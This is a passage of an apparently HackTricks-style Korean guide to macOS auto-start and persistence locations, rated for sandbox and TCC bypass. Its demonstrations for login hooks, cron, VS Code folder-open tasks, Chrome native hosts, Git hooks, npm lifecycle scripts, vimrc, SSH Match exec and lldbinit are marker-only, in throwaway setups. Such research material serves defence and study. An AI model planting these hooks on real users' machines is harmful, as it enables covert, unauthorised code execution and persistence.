이 경로는 레거시 `.qlgenerator` 번들을 가리킵니다. [Apple의 Quick Look 아키텍처 가이드](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html)에는 검색 순서와 일치하는 파일 형식이 설명되어 있습니다. 현재 Quick Look **app extension**은 앱에 포함되며 등록 및 실행 규칙이 다릅니다. generator가 존재한다고 해서 해당 generator가 파일 형식 선택에서 우선되거나 Finder 자체에서 코드가 실행된다고 단정할 수는 없습니다. 레거시 generator 경로는 문서와 디렉터리 존재 여부를 확인했으며, 조사에 사용한 Mac에는 generator가 설치되거나 로드되지 않았습니다.

### ~~로그인/로그아웃 훅~~

> [!CAUTION]
> 사용자 LoginHook과 root LogoutHook 모두 작동하지 않았습니다.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`와 같은 명령을 실행할 수 있어야 합니다.
  - `~/Library/Preferences/com.apple.loginwindow.plist`에 `위치`한 항목입니다.

이 기능은 더 이상 사용되지 않지만, 사용자가 로그인할 때 명령을 실행하는 데 사용할 수 있습니다.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

이 설정은 `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`에 저장됩니다.

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

삭제하려면:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

root 사용자의 항목은 **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**에 저장됩니다.

## Conditional Sandbox Bypass

> [!TIP]
> 여기서는 **sandbox bypass**에 유용한 시작 위치를 확인할 수 있습니다. 파일에 무언가를 **기록하는 것만으로 실행**할 수 있으며, 특정 **프로그램이 설치되어 있거나, 흔하지 않은 사용자의** 동작 또는 환경 같은 **일반적이지 않은 조건**을 기대합니다.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- sandbox bypass에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 단, `crontab` 바이너리를 실행할 수 있어야 합니다.
  - 또는 root 권한이 있어야 합니다.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`**
  - 직접 쓰기 권한에는 root 권한이 필요합니다. `crontab <file>`을 실행할 수 있다면 root 권한은 필요하지 않습니다.
  - **Trigger**: 설치된 crontab의 일정입니다. `at`과 `periodic`은 아래에서 설명하는 별도의 메커니즘입니다.

#### Description & Exploitation

다음 명령으로 **현재 사용자**의 cron 작업을 나열합니다:

```bash
crontab -l
```

시스템 cron 데몬의 launchd plist에는 `/usr/lib/cron/tabs`를 지정하는 `QueueDirectories` 항목이 있습니다. 설치된 사용자 crontab은 이곳에 저장됩니다. 다른 사용자의 crontab을 살펴보려면 root 권한이 필요합니다:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

폐기 가능한 계정에서는 `crontab`으로 표시만 하는 사용자 cron 항목을 설치하고 관찰한 뒤 제거할 수 있습니다. `crontab <file>`을 실행하면 **계정의 기존 crontab 전체가 대체되므로**, 폐기 가능한 계정이 아니라면 기존 crontab을 저장하고 복원하세요:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC 우회: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2에는 이전에 TCC 권한이 부여되어 있었음

#### 위치

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **트리거**: 해당 폴더에 있는 실행 가능한 Python API script로 iTerm2 시작
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **트리거**: iTerm2 시작. AppleScript 시작 hook은 별도로 문서화되어 있음
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **트리거**: command 또는 initial text가 payload를 호출하는 profile로 session 생성

#### 설명 및 Exploitation

[현재 iTerm2 Python API 가이드](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts)에는 `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`에 있는 **Python** script를 자동 실행하는 방법이 설명되어 있습니다. 해당 폴더에 있는 임의의 실행 파일 `.sh`가 실행된다는 내용은 없습니다. 임시 계정에서 다음 내용을 `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`로 저장합니다:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[현재 iTerm2 AppleScript 가이드](https://iterm2.com/documentation-scripting.html)에는 `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`가 별도로 설명되어 있으며, 최신 폴더가 없을 때는 이전 경로인 `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt`를 사용합니다. 마커만 표시하는 AppleScript는 다음과 같습니다:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

이 스크립트 예시는 활성 데스크톱 세션에서 실행한 것이 아니라 iTerm2 문서를 기준으로 확인했습니다. 임시 계정에서 테스트한 후 테스트 스크립트와 `/tmp/ht-iterm-autolaunch-marker` 또는 `/tmp/iterm2-autolaunchscpt`를 각각 삭제하세요.

**`~/Library/Preferences/com.googlecode.iterm2.plist`**에 있는 iTerm2 환경설정에서는 profile command 또는 initial text를 지정할 수 있습니다. 후자는 세션에 입력되며, 실행 여부는 shell이 이를 해석하는지에 따라 달라집니다. [iTerm2의 프로필 문서](https://iterm2.com/documentation-preferences-profiles-general.html)에는 해당 프로필로 새 세션을 만들 때 실행되는 명령이 설명되어 있습니다.

이 설정은 iTerm2 설정에서 구성할 수 있습니다:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

그리고 명령은 환경설정에 반영됩니다:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

안전한 평가를 위해 iTerm2 설정에서 선택한 프로파일을 확인하거나 환경설정 파일의 복사본을 읽으세요. 실행 중인 프로파일에서 `Initial Text`를 변경하면 사용자의 세션에 영향을 주므로, 연구용 Mac에서는 환경설정을 변경하지 않았습니다.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 단, xbar가 설치되어 있어야 합니다
- TCC 우회: [✅](https://emojipedia.org/check-mark-button)
  - Accessibility 권한을 요청합니다

#### 위치

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **트리거**: xbar가 실행될 때

#### 설명

인기 프로그램인 [**xbar**](https://github.com/matryer/xbar)가 설치되어 있다면, **`~/Library/Application\ Support/xbar/plugins/`**에 셸 스크립트를 작성해 xbar가 시작될 때 실행되도록 할 수 있습니다:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 단, Hammerspoon이 설치되어 있어야 합니다
- TCC 우회: [✅](https://emojipedia.org/check-mark-button)
  - Accessibility 권한을 요청합니다

#### 위치

- **`~/.hammerspoon/init.lua`**
  - **트리거**: Hammerspoon이 실행되면

#### 설명

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon)은 **macOS**용 자동화 플랫폼으로, **LUA 스크립팅 언어**를 사용해 작동합니다. 특히 완전한 AppleScript 코드를 통합하고 shell script를 실행할 수 있어 스크립팅 기능이 크게 향상됩니다.<sup>[[13]](#references)</sup>

앱은 단일 파일인 `~/.hammerspoon/init.lua`을 찾으며, 앱이 시작되면 해당 스크립트가 실행됩니다.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- 샌드박스 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 단, BetterTouchTool이 설치되어 있어야 함
- TCC 우회: [✅](https://emojipedia.org/check-mark-button)
  - Automation-Shortcuts 및 Accessibility 권한을 요청함

#### 위치

- 활성화된 BetterTouchTool 프리셋에서 **이미 참조하는** 스크립트 파일 또는 `~/Library/Application Support/BetterTouchTool/` 아래에 있는 해당 프리셋의 설정. 정확한 스크립트 경로는 프리셋 구성 방식에 따라 다름.

[BetterTouchTool의 action reference](https://docs.folivora.ai/docs/actions/action-definitions/)에는 셸 스크립트 및 백그라운드 명령 action이 설명되어 있습니다. 해당 프리셋이 활성화된 동안 설정된 키보드, 마우스, 터치, 위젯 또는 기타 이벤트가 발생해야 합니다. [트리거 가이드](https://docs.folivora.ai/docs/configuration/new-trigger/)에서 이러한 연결 방식을 확인할 수 있습니다. 애플리케이션 지원 디렉터리에 있는 임의의 파일은 트리거가 아닙니다. 외부의 쓰기 가능한 스크립트를 불러오는, 이미 설정된 action은 보다 구체적인 쓰기-후-실행 대상입니다. 코드는 BetterTouchTool 사용자의 계정으로 실행되며, 실제 macOS 권한이 적용됩니다. 조사에 사용한 Mac의 `/Applications`에는 BetterTouchTool이 없었으므로 로컬에서 프리셋을 변경하거나 실행하지 않았습니다.

### Alfred

- 샌드박스 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 단, Alfred가 설치되어 있어야 함
- TCC 우회: [✅](https://emojipedia.org/check-mark-button)
  - Automation, Accessibility, 심지어 Full-Disk access 권한도 요청함

#### 위치

- 설치된 Alfred workflow에서 **이미 참조하는** 스크립트 또는 파일, 혹은 사용자가 설정한 `Alfred.alfredpreferences` 디렉터리에 있는 해당 workflow. 환경설정 디렉터리는 동기화될 수 있으며, 모든 시스템에 공통으로 적용되는 고정 경로는 없습니다.

[Alfred의 workflow 가이드](https://www.alfredapp.com/help/workflows/)에서는 Powerpack 요구 사항과 UI를 통한 설치 방법을 설명합니다. 설치된 workflow의 hotkey, keyword 또는 기타 설정된 트리거가 작동해야 합니다. [Alfred의 hotkey 예시](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/)에서는 스크립트 action을 보여 줍니다. [Alfred의 환경 변수 레퍼런스](https://www.alfredapp.com/help/workflows/script-environment-variables/)에서는 선택된 환경설정 경로를 `alfred_preferences`로 제공합니다. 임의의 디렉터리에 등록되지 않은 workflow 파일을 넣는다고 해서 설치되거나 실행된다는 보장은 없습니다. 코드는 로그인된 Alfred 사용자의 계정으로 실행되며, 실제 macOS 권한이 적용됩니다. 조사에 사용한 Mac의 `/Applications`에는 Alfred가 없었으므로, 이 경로는 문서만을 바탕으로 평가했습니다.

### Raycast Script Commands 및 extension 새로 고침

- **쓰기 대상:** Raycast Settings → Script Commands에 **이미 추가된** 디렉터리에 있는 실행 가능한 스크립트. Raycast는 임의로 새로 만든 디렉터리를 검색하지 않습니다. [Raycast의 Script Commands 가이드](https://manual.raycast.com/script-commands)에서 디렉터리 등록 방법을 설명합니다.
- **트리거 및 실행 계정:** 사용자가 인덱싱된 명령을 실행하거나, 설정된 hotkey 또는 fallback이 명령을 실행하거나, Raycast가 설정된 `@raycast.refreshTime`에 따라 `inline` 스크립트를 새로 고칩니다. 스크립트는 인터프리터를 통해 로그인된 Raycast 사용자의 계정으로 실행됩니다. [upstream metadata 레퍼런스](https://github.com/raycast/script-commands#metadata)에서는 자동 새로 고침이 inline 명령에만 적용된다고 설명합니다. 또한 [Raycast의 extension manifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md)에서는 설치된 `no-view` 또는 `menu-bar` extension 명령에 대해 `interval`을 별도로 지원합니다. 일반 script command를 추가하는 것만으로는 실행 일정이 설정되지 않습니다.

등록된 스크립트 디렉터리가 있는 일회용 계정에서 사용할 수 있는, 마커만 남기는 inline 스크립트는 다음과 같습니다.

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

등록된 디렉터리에 저장하고 실행 가능하게 만든 다음 Raycast가 새로고침하도록 합니다. 그런 다음 해당 파일과 `/tmp/ht-raycast-refresh-marker`를 삭제합니다. 연구용 Mac에서 Raycast가 일반적인 `/Applications` 이름으로 설치되어 있지 않아, 이는 문서에 근거한 내용이며 로컬에서 실행하지 않았습니다. Accessibility, Automation 및 파일 권한은 macOS 권한 프롬프트의 적용을 받습니다.

### Visual Studio Code 자동 workspace 작업

- **대상 파일:** 사용자가 열 workspace 내부의 `.vscode/tasks.json`.
- **트리거:** VS Code에서 해당 workspace를 열 때 실행됩니다. 단, 폴더가 신뢰된 상태이고 자동 작업이 허용된 경우에만 해당합니다. 신뢰되지 않은 workspace에서는 자동 작업이 실행되지 않습니다. 기본 설정에서는 첫 자동 실행 전에 사용자에게 확인을 요청합니다. 두 가지 조건에 대한 설명은 [VS Code task documentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) 및 [Workspace Trust documentation](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust)을 참조하세요.
- **실행 권한:** 구성된 task 프로세스를 통해 VS Code 사용자의 계정으로 실행됩니다. 이는 로그인 지속성이 아니라 애플리케이션별 실행입니다.

**새로운 일회용 workspace**에 다음 마커 전용 task를 `.vscode/tasks.json`에 넣습니다:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

신뢰하는 workspace를 열고 자동 작업을 허용한 후 `.autostart-task-ran`을 확인합니다. 정리하려면 작업 항목과 marker를 제거합니다. **이는 Microsoft 문서와 설치된 VS Code 1.139.1 번들을 기준으로 검증했으며, 활성 데스크톱 세션에서는 실행하지 않았습니다.**

### Chrome 네이티브 메시징 호스트

- **쓰기 대상:** 현재 사용자의 경우 `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json`, 모든 사용자의 경우 `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json`(관리자 쓰기 권한 필요). Chromium과 Chrome for Testing은 디렉터리가 서로 다릅니다. [Chrome의 현재 경로 표](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location)를 참조하세요.
- **실행 조건:** `nativeMessaging` 권한이 있는 설치된 Chrome 확장 프로그램이 manifest에 지정된 정확한 호스트 이름을 사용해 `chrome.runtime.connectNative()` 또는 `chrome.runtime.sendNativeMessage()`를 호출합니다. 그러면 Chrome이 호스트 실행 파일을 시작합니다. Chrome을 여는 것만으로 임의의 새 native host가 실행되지는 않습니다. 호출하는 확장 프로그램 없이 manifest만 만들면 아무 작업도 일어나지 않습니다. [Chrome의 native messaging 가이드](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging)에 이 핸드셰이크가 설명되어 있습니다.
- **실행 사용자:** Chrome 사용자 계정입니다. manifest에는 절대 실행 파일 경로를 지정하고 호출하는 확장 프로그램의 origin을 명시적으로 허용해야 합니다.

테스트용 확장 프로그램이 설치된 일회용 브라우저 계정에서 다음 두 파일 쌍으로 쓰기에서 실행으로 이어지는 과정을 확인할 수 있습니다. manifest 파일 이름은 `name`과 일치해야 하며, `TEST_EXTENSION_ID`는 해당 확장 프로그램의 실제 ID로 바꿔야 합니다:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

이 JSON을 `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`로 저장합니다. 매니페스트의 `path`에 지정된 marker-only 실행 파일에는 다음을 포함할 수 있습니다:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

테스트 확장 프로그램이 서비스 워커 또는 확장 프로그램 페이지에서 `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})`을 호출하면 marker를 통해 호스트가 시작되었음을 확인할 수 있습니다. 이 최소 호스트는 Chrome의 길이 접두사 응답 프로토콜을 구현하지 않으므로, marker가 기록된 후 확장 프로그램에 메시징 오류가 표시될 수 있습니다. 정리하려면 테스트 manifest, 호스트, marker를 제거하세요. macOS 26.5.2에서는 Chrome 앱과 두 manifest 디렉터리가 존재했으며, **활성 Chrome 프로필은 수정하거나 사용하지 않았습니다**.

### Karabiner-Elements 키 이벤트 명령

- **쓰기 대상:** Karabiner-Elements가 설치되어 실행 중인 계정의 `~/.config/karabiner/karabiner.json`. [Karabiner의 파일 위치 안내](https://karabiner-elements.pqrs.org/docs/json/location/)에 따르면 앱은 파일을 감시하며, 파일이 기록된 후 다시 불러옵니다. `assets/complex_modifications`의 JSON 파일은 가져올 수 있는 preset일 뿐입니다. 여기에 파일을 기록하는 것만으로는 규칙이 활성화되지 않습니다.
- **트리거:** 규칙이 활성화된 후 설정된 키 이벤트. [`to.shell_command` 참조](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/)에는 명령 실행 방법이 설명되어 있습니다. 이는 로그인 시 또는 파일이 기록될 때마다 코드가 실행되는 방식이 아닙니다.
- **실행 ID:** Karabiner의 사용자 프로세스를 실행하는 로그인 사용자입니다. 앱의 자체 권한 부여와 TCC 접근 권한은 앱과 버전에 따라 다릅니다.

일회용 테스트 계정에서 `karabiner.json`의 선택한 프로필에 있는 `complex_modifications.rules` 배열에 이 규칙 객체를 추가하되, 나머지 프로필 내용은 유지하세요. F18을 눌러 무해한 marker를 만든 다음, 이 규칙과 marker를 제거하세요. 일반적인 타이핑 키를 바꾸지 않도록 F18을 선택합니다:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements가 macOS 26.5.2 테스트 머신의 `/Applications`에 설치되어 있지 않았으므로, 이는 로컬 런타임 결과가 아니라 문서에 근거한 PoC입니다.

### 로컬 저장소의 Git hooks

- **쓰기 대상:** `<repo>/.git/hooks/post-checkout` 같은 실행 가능한 hook. `core.hooksPath`가 이미 설정되어 있다면 해당 설정 디렉터리를 사용합니다. 일반 추적 소스 파일로 커밋된 hook은 clone에 자동으로 설치되지 않습니다.
- **트리거:** 해당 Git 작업입니다. 예를 들어 `post-checkout`은 `git checkout` 또는 `git switch` 후에 실행되며, clone 또는 worktree 생성 후에도 실행될 수 있습니다. [Git의 hook 참조](https://git-scm.com/docs/githooks)에는 이벤트와 실행 비트 요구 사항이 나와 있고, [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath)는 조회 디렉터리를 변경합니다.
- **실행 계정:** Git을 실행하는 계정입니다. 저장소의 유효 hooks 디렉터리에 해당 사용자가 쓸 수 있어야 하며, 이후 사용자가 관련 Git 작업을 수행해야 hook이 실행됩니다.

이 marker 전용 PoC는 완전히 폐기 가능한 저장소를 만들고, hook 하나를 설치한 다음 브랜치를 전환합니다. macOS 26.5.2에서 Apple Git 2.50.1을 사용해 성공적으로 실행했습니다:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### 프로젝트의 npm lifecycle scripts

- **작성 대상:** 쓰기 가능한 프로젝트의 `package.json`에 있는 `scripts` 맵 또는 사용자가 lifecycle script를 실행할 설치된 dependency 패키지입니다. 이는 개발 워크플로 훅이며, 디렉터리를 여는 것만으로 실행되지는 않습니다.
- **트리거 및 실행 사용자:** lifecycle scripts가 허용된 상태에서 이후 `npm install` 또는 `npm ci`를 실행하면, `preinstall`, `install`, `postinstall`이 npm을 실행한 사용자 권한으로 실행됩니다. 일반적인 `npm run <name>`도 일치하는 `pre<name>` 및 `post<name>` scripts를 실행합니다. [npm의 lifecycle 참조 문서](https://docs.npmjs.com/cli/v11/using-npm/scripts)에 이벤트가 나열되어 있으며, [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts)로 install lifecycle scripts를 억제할 수 있습니다. 버전 및 정책 설정에 따라 허용되는 항목이 달라질 수 있으므로 대상 npm 버전을 확인하세요.

이 marker-only PoC는 폐기 가능한 빈 디렉터리에서 로컬 npm으로 실행했습니다. dependency를 다운로드하거나 사용자의 프로젝트를 변경하지 않습니다:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

이는 Python interpreter startup 파일과는 다릅니다. npm은 관련 install 또는 run 작업을 수행해야 하지만, Python `site` 코드는 일반적인 interpreter 실행 시 로드될 수 있습니다. 일반적인 `Makefile` 타깃과 빌드 작업 정의 역시 사용자가 직접 또는 이미 설정된 도구를 통해 해당 타깃을 실행해야 합니다. 별도의 OS auto-start 경로는 아닙니다.

### Vim 시작 구성

- **기록 대상:** Vim을 실행할 사용자의 `~/.vimrc`(또는 Vim의 초기화 순서에 따라 선택되는 다른 시작 파일). [Vim의 시작 관련 참조 문서](https://vimhelp.org/starting.txt.html)에서 파일과 `VIMINIT`/`EXINIT` 재정의를 설명합니다.
- **트리거:** 이 구성을 로드하는 이후의 일반적인 Vim 실행. Vim의 `-u NONE` 옵션은 사용자 vimrc를 건너뜁니다. 이는 OS 로그인 트리거가 아니라 editor별 실행입니다.
- **실행 계정:** Vim 사용자의 계정.

다음 격리된 PoC는 macOS의 `/usr/bin/vim`에서 실행되었습니다. 실제 Vim 환경 설정이나 열린 문서는 변경하지 않습니다:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim에는 별도의 사용자 설정 경로인 `$XDG_CONFIG_HOME/nvim/init.lua` 또는 `init.vim`이 있으며, [시작 문서](https://neovim.io/doc/user/starting/)에 따라 `plugin/` 런타임 디렉터리의 스크립트도 로드합니다. macOS 26.5.2 테스트 시스템에는 Neovim이 설치되어 있지 않아 이 변형은 실행하지 않았습니다.

### SSH 클라이언트 설정 명령

- **쓰기 대상:** `~/.ssh/config` 또는 해당 파일이 이미 포함하는 다른 파일. 이는 **클라이언트** 설정 파일이며, 아래에 설명된 서버 측 `~/.ssh/rc`와는 별개입니다.
- **트리거:** 조건에 일치하는 `ssh` 호출. 클라이언트가 설정을 평가하는 동안 `Match exec`는 로컬 명령을 실행하며, 연결 없이 설정을 출력하는 `ssh -G`에서도 실행됩니다. 클라이언트가 일치하는 연결을 설정할 때 `ProxyCommand`가 실행됩니다. `LocalCommand`는 연결에 성공한 뒤에만 실행되며 `PermitLocalCommand yes`가 필요합니다(기본값은 `no`). 이 항목들은 실행 시점과 전제 조건이 서로 다르므로, 파일에 쓰기만 해서는 실행되지 않습니다. 업스트림 [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5)를 참조하세요.
- **실행 주체:** `ssh`를 실행하는 로컬 사용자. 일치하는 호스트와 적용되는 설정 파일이 필요하며, 연결이 필요한 경우 연결도 필요합니다. `ssh -F`를 사용하면 다른 설정 파일을 지정할 수 있습니다.

이 마커 전용 PoC는 macOS 26.5.2에서 Apple의 SSH 클라이언트로 실행했습니다. `-G`는 네트워크 연결을 만들거나 사용자의 실제 SSH 설정을 읽지 않고 `Match exec`를 실행합니다:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### 디버거 초기화 파일

- **쓰기 대상:** `~/.lldbinit` 또는 우선순위가 더 높은 `~/.lldbinit-lldb` 같은 애플리케이션별 파일. LLDB는 디버거가 시작될 때 파일 하나를 읽습니다. 현재 디렉터리의 `.lldbinit`은 기본적으로 실행되지 않습니다. 사용자가 `target.load-cwd-lldbinit`을 활성화하거나 `--local-lldbinit`을 전달해야 합니다. [LLDB 매뉴얼](https://lldb.llvm.org/man/lldb.html)을 참조하세요.
- **트리거 및 사용자 ID:** 사용자가 `--no-lldbinit` 없이 LLDB를 시작하며, 명령은 해당 사용자로 실행됩니다. 프로젝트를 여는 것만으로 프로젝트의 `.lldbinit`이 실행되는 것은 아닙니다.

다음 마커 전용 테스트는 격리된 홈 디렉터리와 작업 디렉터리를 사용해 macOS 26.5.2에서 LLDB로 실행했습니다.

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**, [upstream startup documentation](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html)에는 macOS에서 `$HOME/Library/Preferences/gdb/gdbinit` 다음으로 `~/.gdbinit`이 나열되어 있습니다. 현재 디렉터리의 `.gdbinit`은 [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html)의 적용을 받으며, `-nx`/`-nh`는 초기화 파일을 비활성화합니다. 테스트한 Mac에는 GDB가 설치되어 있지 않아 이 변형은 로컬에서 실행하지 않았습니다.

### SSHRC

작성글: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 단, ssh가 활성화되어 있고 사용되어야 함
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH를 사용하면 FDA 접근 권한을 가짐

#### 위치

- **`~/.ssh/rc`**
  - **트리거**: ssh로 로그인
- **`/etc/ssh/sshrc`**
  - root 권한 필요
  - **트리거**: ssh로 로그인

> [!CAUTION]
> ssh를 켜려면 Full Disk Access가 필요합니다:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### 설명 및 악용

기본적으로 `/etc/ssh/sshd_config`에 `PermitUserRC no`가 설정되어 있지 않으면, 사용자가 **SSH로 로그인할 때** **`/etc/ssh/sshrc`** 및 **`~/.ssh/rc`** 스크립트가 실행됩니다.<sup>[[14]](#references)</sup>

### **로그인 항목**

작성 문서: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 단, 인수와 함께 `osascript`를 실행해야 합니다.
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **등록된 로그인 항목 헬퍼 앱:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (일반적인 번들 위치).
  - **트리거:** 등록 시 헬퍼가 즉시 시작될 수 있으며, 이후 사용자 로그인 시에도 승인을 받으면 시작됩니다.
- **등록된 번들 에이전트/데몬:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` 또는 `Contents/Library/LaunchDaemons/<name>.plist`.
